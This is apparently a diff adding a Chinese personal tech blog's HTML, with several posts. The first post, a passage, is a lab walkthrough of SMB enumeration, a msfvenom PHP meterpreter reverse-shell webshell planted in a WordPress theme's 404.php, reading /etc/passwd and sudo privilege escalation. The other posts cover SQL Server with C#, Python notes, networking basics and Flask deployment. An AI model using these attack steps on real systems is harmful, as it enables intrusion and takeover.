+<li>smbclient -L IP</li>
+<li>smbclient ‘\IP$share’</li>
+<li>get 敏感文件</li>
+<li>敏感信息：<ol>
+<li>deets.txt</li>
+<li>wordpress</li>
+<li>config</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>针对SMB协议远程溢出漏洞进行分析；<ol>
+<li>searchsploit samba 版本号</li>
+</ol>
+</li>
+<li>登陆数据库<ol>
+<li>mysql -h IP -u Admin -p</li>
+</ol>
+</li>
+<li>针对HTTP协议拖点分析<ol>
+<li>浏览器查看网站</li>
+<li>使用 dirb  nikto 探测</li>
+<li>寻找突破点，目标登陆后台，上传webshell</li>
+</ol>
+</li>
+<li>制作webshell<ol>
+<li>msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP地址 lport=4444 -f raw &gt; /root/Desktop/shell.php</li>
+</ol>
+</li>
+<li>启动监听<ol>
+<li>msf &gt; use exploit/multi/handler</li>
+<li>msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</li>
+<li>msf exploit(handler) &gt; set lhost 攻击机IP</li>
+<li>msf exploit(handler) &gt; set lport 4444</li>
+<li>msf exploit(handler) &gt; run</li>
+</ol>
+</li>
+<li>上传webshell<ol>
+<li>使用找到的敏感信息登陆系统后台，上传webshell。执行webshell（访问具有webshell的php页面）</li>
+<li>获得反弹的shell</li>
+<li>wordpress 上传点 theme 404.php</li>
+<li>执行：http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</li>
+</ol>
+</li>
+<li>查找flag信息<ol>
+<li>优化终端：python -c “import pty; pty.spawn(‘/bin/bash’)”</li>
+<li>查找敏感信息，提升root权限，查看flag值</li>
+<li>查找用户名：cat /etc/passwd</li>
+<li>查找密码：在共享目录下的敏感文件，提升权限</li>
+<li>su 用户名</li>
+<li>sudo -l</li>
+<li>su sudo</li>
+</ol>
+</li>
+<li>总结<ol>
+<li> 对于开放139和445端口的机器一定要注意是否可以直接使用smbclient登录到共享目录查找敏感文件</li>
+<li> 一般情况下flag值都在/root目录下，并且需要提升root权限才能查看内容</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-9-8-71/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-9-8-71/" class="post-title-link" itemprop="url">71. C#连接数据库</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：22:35:39" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>sql server在安装时，一般都会选择默认实例服务器以Window身份认证，以电脑账户为名称无密码形式存在，后期我们开发项目时，用到的数据库服务器都是以IP为名称，单独设立密码的，此时我们默认安装的服务器引擎怎么修改成项目通用形式呢。</p>
+</blockquote>
+<hr>
+<ul>
+<li><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1></li>
+</ul>
+<ol>
+<li>打开数据库，使用默认账户登录（电脑默认账户，无密码）。<br><img src="/source/imagess/posts/csharp_connect_database/1.png"></li>
+<li>右击”服务器引擎”，选择“属性”表中的“安全性”，“服务器身份验证” 选择 “SQL Server”和“Windows身份验证模式”，这一步在下面好像可以再选，具体本人没试过。<br><img src="/source/imagess/posts/csharp_connect_database/2.png">   </li>
+<li>找到数据库 “安全性” –&gt;“登录名” –&gt;“sa” 右击属性，可以修改“登录名”，以SQL Server身份验证，填写密码(密码可能会需要复杂度，字母数字组合，修改失败注意下)。<br><img src="/source/imagess/posts/csharp_connect_database/3.png">   </li>
+<li>依旧是上面截图这里，看“状态栏”内容，有人忘了设置这里，去用”sa”账户登录，得到错误，此账户禁止使用，原因就在这里，在这里我们要设置“登录”选项为“启用”。<br><img src="/source/imagess/posts/csharp_connect_database/4.png">   </li>
+<li>上面说了怎么修改服务器的名称和密码，可以用下面方式登录数据库。<br><img src="/source/imagess/posts/csharp_connect_database/5.png">      </li>
+<li>但是我们的最终目标是以IP为登录名来登录数据库，打开Sql Server配置管理器（Sql Server Configuration Manager）,找到“SQL Server网络配置”，进入“SQLEXPRESS的协议” ，“TCP/IP”右击属性 “协议” 中“已启用”修改为“是”<br><img src="/source/imagess/posts/csharp_connect_database/6.png">   </li>
+<li>继续操作第6步，“TCP/IP”右击属性 “IP 地址” 中 修改 “IP2”中的 IP地址 为自己的电脑IP，这里必须是自己电脑的IP，不是你自己随便给的IP。<br><img src="/source/imagess/posts/csharp_connect_database/7.png">   </li>
+<li>在Sql Server配置管理器（Sql Server Configuration Manager）中重启数据库服务。<br><img src="/source/imagess/posts/csharp_connect_database/8.png">   </li>
+<li>以IP为名称登录，结束。<br><img src="/source/imagess/posts/csharp_connect_database/9.png"> </li>
+</ol>
+<ul>
+<li><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1></li>
+</ul>
+<ol>
+<li>出现<code>SQL Server2014“用户&#39;sa&#39;登录失败，错误18456”问题</code><br><img src="/source/imagess/posts/csharp_connect_database/10.png"><ol>
+<li>使用Windows身份验证登录数据库。<br><img src="/source/imagess/posts/csharp_connect_database/11.png"></li>
+<li>右键数据库服务器名，选择【属性】。<br><img src="/source/imagess/posts/csharp_connect_database/12.png"></li>
+<li>打开“服务器属性”窗口，选择【安全性】，更改“服务器身份验证”，如下图所示。<br><img src="/source/imagess/posts/csharp_connect_database/13.png"></li>
+<li>展开数据库服务器名—“安全性”—“登录名”， 右键“sa”用户，选择【属性】。<br><img src="/source/imagess/posts/csharp_connect_database/14.png"></li>
+<li>打开“登录属性”窗口，选择【常规】，设置密码。<br><img src="/source/imagess/posts/csharp_connect_database/15.png"></li>
+<li>仍然在“登录属性”窗口，选择【状态】，选择“登录”下面的【已启用】，如下图所示。<br><img src="/source/imagess/posts/csharp_connect_database/16.png"></li>
+<li>右键数据库服务器名，选择【重新启动】。</li>
+</ol>
+</li>
+</ol>
+<ul>
+<li><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">SqlConnectionStringBuilder scsb = <span class="keyword">new</span> SqlConnectionStringBuilder();</span><br><span class="line">scsb.DataSource = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">scsb.UserID = <span class="string">&quot;sa&quot;</span>;</span><br><span class="line">scsb.Password = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">scsb.InitialCatalog = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//MessageBox.Show(scsb.ToString());</span></span><br><span class="line">SqlConnection conn = <span class="keyword">new</span> SqlConnection(scsb.ToString());</span><br><span class="line"><span class="keyword">if</span> (conn.State == System.Data.ConnectionState.Closed) conn.Open();</span><br><span class="line"><span class="built_in">string</span> str_sql = <span class="string">&quot;select * from customer&quot;</span>;</span><br><span class="line"><span class="comment">//SqlCommand comm = new SqlCommand(str_sql, conn);    // 查询单行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询数据表</span></span><br><span class="line">SqlDataAdapter da = <span class="keyword">new</span> SqlDataAdapter(str_sql, conn);</span><br><span class="line">DataSet ds = <span class="keyword">new</span> DataSet();</span><br><span class="line">da.Fill(ds, <span class="string">&quot;test&quot;</span>); <span class="comment">// 参数1：dataset对象； 参数2：表名，自定义的名字，不需要和查询的表名相同</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 绑定数据到datagridview */</span></span><br><span class="line"><span class="comment">/* 方法一 */</span></span><br><span class="line"><span class="comment">// show_dataGridView.DataSource = ds;</span></span><br><span class="line"><span class="comment">// show_dataGridView.DataMember = &quot;test&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 方法二 */</span></span><br><span class="line"><span class="comment">//prod_dataGridView.DataSource = ds.Tables[&quot;product&quot;];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 方法三 */</span></span><br><span class="line">DataTable dt = ds.Tables[<span class="string">&quot;test&quot;</span>];</span><br><span class="line">prod_dataGridView.DataSource = dt.DefaultView;</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-8-27-70/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-8-27-70/" class="post-title-link" itemprop="url">70. C/C++ 知识点</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：21:58:11" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><h1 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h1></li>
+<li><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-8-21-69/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-8-21-69/" class="post-title-link" itemprop="url">69. Python易混的点</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：21:58:11" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><h1 id="axis"><a href="#axis" class="headerlink" title="axis"></a>axis</h1><ul>
+<li>轴用来为超过一维的数组定义的属性，二维数据拥有两个轴：第0轴沿着行的垂直往下，第1轴沿着列的方向水平延伸。   </li>
+<li>官方对于0和1的解释是轴，也就是坐标轴。而坐标轴是有方向的，所以千万不要用行和列的思维去想axis，因为行和列是没有方向的，这样想会在遇到不同的例子时感到困惑。</li>
+<li>axis的重点在于方向，而不是行和列。具体到各种用法而言也是如此。当axis=1时，如果是求平均，那么是从左到右横向求平均；如果是拼接，那么也是左右横向拼接；如果是drop，那么也是横向发生变化，体现为列的减少。</li>
+<li>当考虑了方向，即axis=1为横向，axis=0为纵向，而不是行和列，那么所有的例子就都统一了。</li>
+</ul>
+</li>
+<li><h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><ul>
+<li>eval() 函数用来执行一个字符串表达式，并返回表达式的值。<h3 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;x &#x3D; 7</span><br><span class="line">&gt;&gt;&gt; eval( &#39;3 * x&#39; )</span><br><span class="line">21</span><br><span class="line">&gt;&gt;&gt; eval(&#39;pow(2,2)&#39;)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; eval(&#39;2 + 2&#39;)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; n&#x3D;81</span><br><span class="line">&gt;&gt;&gt; eval(&quot;n + 4&quot;)</span><br><span class="line">85</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><h1 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h1><ol>
+<li><p>将lambda函数赋值给一个变量，通过这个变量间接调用该lambda函数。</p>
+<blockquote>
+<p>例如，执行语句add=lambda x, y: x+y，定义了加法函数lambda x, y: x+y，并将其赋值给变量add，这样变量add便成为具有加法功能的函数。例如，执行add(1,2)，输出为3。</p>
+</blockquote>
+</li>
+<li><p>将lambda函数赋值给其他函数，从而将其他函数用该lambda函数替换。</p>
+<blockquote>
+<p>例如，为了把标准库time中的函数sleep的功能屏蔽(Mock)，我们可以在程序初始化时调用：time.sleep=lambda x:None。这样，在后续代码中调用time库的sleep函数将不会执行原有的功能。例如，执行time.sleep(3)时，程序不会休眠3秒钟，而是什么都不做。</p>
+</blockquote>
+</li>
+<li><p>将lambda函数作为其他函数的返回值，返回给调用者。</p>
+<blockquote>
+<p>函数的返回值也可以是函数。例如return lambda x, y: x+y返回一个加法函数。这时，lambda函数实际上是定义在某个函数内部的函数，称之为嵌套函数，或者内部函数。对应的，将包含嵌套函数的函数称之为外部函数。内部函数能够访问外部函数的局部变量，这个特性是闭包(Closure)编程的基础，在这里我们不展开。</p>
+</blockquote>
+</li>
+<li><p>将lambda函数作为参数传递给其他函数。</p>
+<blockquote>
+<p>部分Python内置函数接收函数作为参数。典型的此类内置函数有这些。</p>
+</blockquote>
+<ul>
+<li><p>filter函数。此时lambda函数用于指定过滤列表元素的条件。例如filter(lambda x: x % 3 == 0, [1, 2, 3])指定将列表[1,2,3]中能够被3整除的元素过滤出来，其结果是[3]。</p>
+</li>
+<li><p>sorted函数。此时lambda函数用于指定对列表中所有元素进行排序的准则。例如sorted([1, 2, 3, 4, 5, 6, 7, 8, 9], key=lambda x: abs(5-x))将列表[1, 2, 3, 4, 5, 6, 7, 8, 9]按照元素与5距离从小到大进行排序，其结果是[5, 4, 6, 3, 7, 2, 8, 1, 9]。</p>
+</li>
+<li><p>map函数。此时lambda函数用于指定对列表中每一个元素的共同操作。例如map(lambda x: x+1, [1, 2,3])将列表[1, 2, 3]中的元素分别加1，其结果[2, 3, 4]。</p>
+</li>
+<li><p>reduce函数。此时lambda函数用于指定列表中两两相邻元素的结合条件。例如reduce(lambda a, b: ‘{}, {}’.format(a, b), [1, 2, 3, 4, 5, 6, 7, 8, 9])将列表 [1, 2, 3, 4, 5, 6, 7, 8, 9]中的元素从左往右两两以逗号分隔的字符的形式依次结合起来，其结果是’1, 2, 3, 4, 5, 6, 7, 8, 9’。</p>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-8-21-68/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-8-21-68/" class="post-title-link" itemprop="url">68. 编程软件快捷键</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：21:58:11" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><h1 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h1><h4 id="1-Notepad"><a href="#1-Notepad" class="headerlink" title="1. Notepad"></a>1. Notepad</h4></li>
+</ul>
+<ul>
+<li><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1></li>
+</ul>
+<h4 id="1-Anaconda"><a href="#1-Anaconda" class="headerlink" title="1. Anaconda"></a>1. Anaconda</h4><ol>
+<li>自动补全： <code>Tab</code></li>
+<li><h4 id="2-Vscode"><a href="#2-Vscode" class="headerlink" title="2. Vscode"></a>2. Vscode</h4></li>
+<li>自动补全: <code>ctrl+space</code></li>
+</ol>
+<h4 id="3-Pycharm"><a href="#3-Pycharm" class="headerlink" title="3. Pycharm"></a>3. Pycharm</h4><ul>
+<li><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-8-20-67/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-8-20-67/" class="post-title-link" itemprop="url">67. 计算机网络</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：22:35:39" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><h1 id="第一章-计算机网络概述"><a href="#第一章-计算机网络概述" class="headerlink" title="第一章 计算机网络概述"></a>第一章 计算机网络概述</h1><ol>
+<li><p>概念：</p>
+<ol>
+<li><p>局域网</p>
+<ol>
+<li>覆盖范围小，自己花钱买设备，带宽固定，自己维护</li>
+<li><img src="/source/imagess/posts/computer_network/1.png"></li>
+<li><blockquote>
+<p>注意：</p>
+<ol>
+<li>电脑到交换机长度不超过100米</li>
+<li>交换机之间的长度也不超过100米</li>
+<li>交换机会加强信号</li>
+<li>带宽：如：100兆：则每个口都是百兆带宽</li>
+<li>交换机端口带宽要高，口不一定多</li>
+<li>不要串联，防止流量太大，规范的计算机：应该是分层。</li>
+<li>带宽：10M、 100M、 1000M</li>
+</ol>
+</blockquote>
+</li>
+</ol>
+</li>
+<li><p>广域网</p>
+<ol>
+<li>距离比较远，超过100米</li>
+<li>带宽不固定</li>
+<li>花钱买带宽</li>
+<li>链路不需要自己维护</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ul>
+<pre><code> 3. Internet
+    1. 全球最大的互联网络
+    2. 由众多的ISP组成
+    3. ISP：Internet服务提供商
+    4. 运营商内部四通八达
+    5. 运营商有自己的机房
+    6. 跨运营商访问比较慢
+    7. 互联网的运营商很多
+    8. 对网民提供访问Internet连接
+ 4. 规划IP地址介绍和MAC地址
+    1. 全球的计算机都得有IP地址。类似于写信得有地址
+    2. 地址不能重复
+    3. 讲解ip：例如：IP：13.0.0.0； 子网掩码：255.0.0.0
+       1. 13：是网络部分
+       2. 0.0.0：是主机部分
+    4. 网络掩码：告诉计算机哪是网络部分，哪是主机部分
+    5. 一个255，对应位置上则是网络部分
+    6. 一个局域网中，交换机上连接的计算机，他们的网络部分相同
+    7. 网关：到其他网段的应该给谁
+    8. 路由器作用：在不同网段转发数据
+    9. MAC地址（物理地址）：
+       1. 出厂的时候就已经固定到芯片里面了，48位的二进制。
+       2. 全球唯一
+ 5. 数据包和数据帧
+    1. 计算机都配有DNS，其中：
+       1. DNS：用来解析地址
+    2. 发送数据包，需要做的事：
+       1. 写上原地址（即自己的地址）
+       2. 写上目标地址
+       3. 目标MAC地址（疑问：通过IP地址来确定MAC地址？）
+       4. 原MAC地址
+    3. 发送时，先将数据包扔给路由器，让路由器往外转。扔的时候为了给路由器，此时则需要MAC地址
+    4. 数据包：没加MAC地址&lt;br/&gt;数据帧：加上MAC地址
+    5. 路由器转发数据时，需要用到了IP地址
+    6. 每次转发时，MAC地址需要重新写：原MAC地址和目标MAC地址
+    7. 包不变
+    8. IP地址决定了数据包最终到哪去
+    9. MAC地址决定了要想到目的地下一跳给谁
+    10. 为什么交换机就能直接得到mac地址，而路由器不可以
+    11. 交换机转发时看mac地址，IP地址看不懂
+    12. 路由器看IP地址，决定下一跳给哪个路由器
+
+ 6. 访问网站数据传输过程
+    1. 将网页切割，如下图所示：&lt;br/&gt;
+       ![](/source/imagess/posts/computer_network/2.png)
+    2. 切割完毕，将数据放到缓存中
+    3. 网卡都有缓存：接收缓存、发送缓存
+    4. 只有接收到数据包之后才会删除缓存
+
+ 7. OSI参考模型
+    1. 这是计算机通讯规范
+    2. 应用层：所有能产生网络流量的程序
+    3. 表示层：在传输之前是否进行加密、压缩处理，二进制、ASCII码（编码方式应一一对应）
+    4. 会话层： `netstat -n`
+       1. TIME_WAIT：快要释放了
+       2. 可以查看木马（木马需要和外界联系，只要有联系，就会有会话）
+    5. 传输层：可靠传输、流量控制、不可靠传输
+    6. 网络层：负责选择最佳路径，规划IP地址
+    7. 数据链路层：帧的开始和结束；透明传输、差错校验
+    8. 物理层：接口标准 电器标准；如何在物理链路上传输更快的速度
+ 8. 理解OSI参考模型分层思想
+    1. 较为独立，某一层发生改变时，不会引起其它层的改变
+    2. </code></pre>
+<ol start="2">
+<li></li>
+</ol>
+<ul>
+<li><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1></li>
+<li><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ol>
+<li>查看帮助：/? 如：<code>ping /?</code></li>
+</ol>
+</li>
+</ul>
+<!-- 1. 计算机网络是计算机技术和通讯技术相结合的产物
+1. 计算机网络：是一个将 *分散的* 、具有 *独立功能* 的 *计算机系统*，通过*通信设备*与 *线路* 连接起来，由功能完善的 *软件*实现 *资源共享* 和 *信息传输*。
+   1. 分散的：是指地理位置不同
+   2. 独立功能：是说这些计算机系统他们这些功能是不一样的，是相互独立起来的
+   3. 计算机系统：既包括手机端，比如：安卓系统手机端、ios系统手机端；也有电脑端，如：macos、windows、linux等。
+   4. 通信设备：通常是交换机和路由器
+   5. 线路：就是指这些端系统和通信设备所连接的一个介质
+   6. 软件：如果只包含计算机系统、通信设备、线路，就好像只盖了一个房子，却没有装修，只有在系统安装软件才能实现这些功能：资源共享、信息传输，如：QQ、微信等
+   7.  -->
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-8-19-66/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-8-19-66/" class="post-title-link" itemprop="url">66. Flask 部署上线</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：22:35:39" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><h1 id="购买服务器"><a href="#购买服务器" class="headerlink" title="购买服务器"></a>购买服务器</h1></li>
+</ul>
+<ol>
+<li>购买一个服务器，如在：阿里云、腾讯云上买等（阿里云有学生版）；</li>
+<li>将服务器添加安全组<ol>
+<li>进入实例列表，点击 <code>更多</code> - <code>网络和安全组</code> - <code>安全组配置</code> - ``，如图所示：<br><img src="/source/imagess/posts/flask/1.png"></li>
+<li>进入<code>配置规则</code>：<br><img src="/source/imagess/posts/flask/2.png"></li>
+<li>选择 <code>添加安全组规则</code>：<br><img src="/source/imagess/posts/flask/3.png"></li>
+<li>将所指的地方，一模一样的填入到你的规则下<br><img src="/source/imagess/posts/flask/4.png"></li>
+</ol>
+</li>
+</ol>
+<ul>
+<li><h1 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h1></li>
+</ul>
+<ol>
+<li>使用 <code>xshell</code> 连接<ol>
+<li>具体使用，百度</li>
+</ol>
+</li>
+<li>使用 <code>cmd</code> 连接<ol>
+<li>连接实例： <code>ssh demo@123.123.123.123</code></li>
+<li>其中：<code>demo</code> 为用户名， <code>123.123.123.123</code>为公网地址</li>
+</ol>
+</li>
+</ol>
+<ul>
+<li><h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><blockquote>
+<p>根据以上方法可以连接上 <code>ubuntu</code> 了</p>
+</blockquote>
+<h3 id="该配置以-lqr-为-用户名；以-MMCs-为-实战项目，-为注释"><a href="#该配置以-lqr-为-用户名；以-MMCs-为-实战项目，-为注释" class="headerlink" title="该配置以 lqr 为 用户名；以 MMCs 为 实战项目，//为注释"></a>该配置以 <code>lqr</code> 为 <strong><em>用户名</em></strong>；以 <code>MMCs</code> 为 <strong><em>实战项目</em></strong>，<code>//</code>为注释</h3></li>
+</ul>
+<ol>
+<li><p>更新系统可安装的包文件，并对课升级的包，进行升级： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br></pre></td></tr></table></figure></li>
+<li><p>创建用户：<code>adduser lqr</code></p>
+</li>
+<li><p>为用户赋予 <code>root</code> 权限： <code>usermod -aG sudo lqr</code></p>
+</li>
+<li><p>切换用户： <code>su lqr</code></p>
+</li>
+<li><p>python3 安装 <code>pip、dev</code>：<code>sudo apt install python3-dev python3-pip</code></p>
+</li>
+<li><p>查看 <code>pip3</code> 的版本： <code>pip3 --version</code></p>
+</li>
+<li><p>为 <code>pip、pip3</code> 设置镜像： </p>
